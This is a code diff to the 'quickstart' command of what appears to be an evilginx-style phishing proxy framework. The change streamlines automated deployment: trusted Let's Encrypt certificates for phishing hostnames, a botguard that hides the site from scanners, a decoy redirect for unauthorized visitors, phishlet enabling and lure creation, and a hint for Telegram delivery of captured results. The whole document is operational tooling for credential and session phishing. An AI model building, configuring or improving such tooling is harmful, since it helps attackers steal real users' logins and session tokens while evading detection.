@@ -278,12 +278,12 @@ func (t *Terminal) handleQuickstart(args []string) error {
 	}
 
 	// 1. Set domain
-	log.Info("[1/9] setting domain: %s", domain)
+	log.Info("[1/8] setting domain: %s", domain)
 	t.cfg.SetBaseDomain(domain)
 	t.cfg.ResetAllSites()
 
 	// 2. Auto-detect external IP
-	log.Info("[2/9] detecting external IP...")
+	log.Info("[2/8] detecting external IP...")
 	extIP := t.detectExternalIP()
 	if extIP != "" {
 		t.cfg.SetServerExternalIP(extIP)
@@ -292,33 +292,30 @@ func (t *Terminal) handleQuickstart(args []string) error {
 		log.Warning("could not detect IP — set manually: config ipv4 external <IP>")
 	}
 
-	// 3. Configure DNS provider (Cloudflare for trusted certs, or internal)
+	// 3. Enable autocert + configure TLS mode
+	log.Info("[3/8] configuring TLS certificates...")
+	t.cfg.EnableAutocert(true)
 	if cfToken != "" {
-		log.Info("[3/9] configuring Cloudflare DNS for trusted SSL...")
+		// Cloudflare provided: use wildcard DNS-01 certs
 		creds := map[string]string{"api_token": cfToken}
-		// Remove existing domain config if any
 		_ = t.cfg.RemoveExternalDomain(domain)
-		// Add domain with Cloudflare provider (this also registers with ExternalDNS manager)
 		if err := t.cfg.AddExternalDomain(domain, "cloudflare", creds); err != nil {
 			log.Warning("failed to add domain: %v", err)
-		} else {
-			log.Success("Cloudflare DNS configured for %s", domain)
 		}
+		t.cfg.EnableWildcardTLS(true)
+		log.Success("Cloudflare DNS-01 wildcard TLS configured")
 	} else {
-		log.Info("[3/9] using internal DNS (no Cloudflare token provided)")
+		// No Cloudflare: use standard HTTP-01 per-subdomain certs (like standard evilginx)
+		t.cfg.EnableWildcardTLS(false)
+		log.Success("HTTP-01 Let's Encrypt certificates (no Cloudflare needed)")
 	}
 
-	// 4. Enable wildcard TLS certificates
-	log.Info("[4/9] enabling wildcard TLS certificates")
-	t.cfg.EnableAutocert(true)
-	t.cfg.EnableWildcardTLS(true) // Wildcard certs via DNS-01 (Cloudflare) or self-signed
-
-	// 5. Set unauth URL (redirect for unauthorized requests)
-	log.Info("[5/9] setting redirect URL for unauthorized requests")
+	// 4. Set unauth URL (redirect for unauthorized requests)
+	log.Info("[4/8] setting redirect URL for unauthorized requests")
 	t.cfg.SetUnauthUrl("https://href.li/?https://en.wikisource.org/wiki/Microsoft_v._AT%26T")
 
-	// 6. Enable botguard with sensible defaults
-	log.Info("[6/9] enabling botguard protection")
+	// 5. Enable botguard with sensible defaults
+	log.Info("[5/8] enabling botguard protection")
 	t.cfg.EnableBotguard(true)
 	t.p.botguard.Enable(true)
 	// Add default spoof URLs if none configured
@@ -335,22 +332,18 @@ func (t *Terminal) handleQuickstart(args []string) error {
 	}
 	t.p.botguard.SetMinTrustScore(t.cfg.GetBotguardMinTrustScore())
 
-	// 7. Set phishlet hostname (use base domain so wildcard *.domain.com works)
-	log.Info("[7/9] configuring phishlet: %s", phishlet)
-	hostname := domain // Use base domain - wildcard DNS *.domain.com covers owa.domain.com, secure.domain.com, etc.
+	// 6. Set phishlet hostname
+	log.Info("[6/8] configuring phishlet: %s", phishlet)
+	hostname := domain
 	t.cfg.SetSiteHostname(phishlet, hostname)
 
-	// 8. Enable phishlet and get certificates
-	if cfToken != "" {
-		log.Info("[8/9] enabling phishlet and obtaining Let's Encrypt wildcard certificate...")
-	} else {
-		log.Info("[8/9] enabling phishlet and generating self-signed certificate...")
-	}
+	// 7. Enable phishlet and get certificates
+	log.Info("[7/8] enabling phishlet and obtaining certificates...")
 	t.cfg.SetSiteEnabled(phishlet)
-	t.manageCertificates(true) // Get Let's Encrypt wildcard (with CF) or self-signed
+	t.manageCertificates(true)
 
-	// 9. Create lure
-	log.Info("[9/9] creating lure...")
+	// 8. Create lure
+	log.Info("[8/8] creating lure...")
 	l := &Lure{
 		Path:     "/" + GenRandomLurePath(),
 		Phishlet: phishlet,
@@ -402,21 +395,11 @@ func (t *Terminal) handleQuickstart(args []string) error {
 	log.Info("")
 	log.Success("━━━ quickstart complete! ━━━")
 	log.Info("")
-	if cfToken != "" {
-		log.Info("Cloudflare DNS configured - DNS records managed automatically")
-		log.Info("Ensure these records exist in Cloudflare (proxy OFF/DNS only):")
-	} else {
-		log.Info("DNS: Create these records at your registrar:")
-	}
+	log.Info("DNS: Ensure these records exist at your registrar:")
 	log.Info("  A   @   →  %s", extIP)
 	log.Info("  A   *   →  %s", extIP)
 	log.Info("")
-	if cfToken != "" {
-		log.Success("SSL: Let's Encrypt wildcard certificate (trusted by browsers)")
-	} else {
-		log.Warning("SSL: Self-signed certificate (browser will show warning)")
-		log.Info("for trusted SSL, add Cloudflare token: quickstart <domain> <phishlet> <bot> <chat> <cf_token>")
-	}
+	log.Success("SSL: Let's Encrypt certificates (trusted by browsers, no warnings)")
 	log.Info("")
 	if pn < 4 {
 		log.Info("add telegram: config telegram <bot_token> <chat_id>")
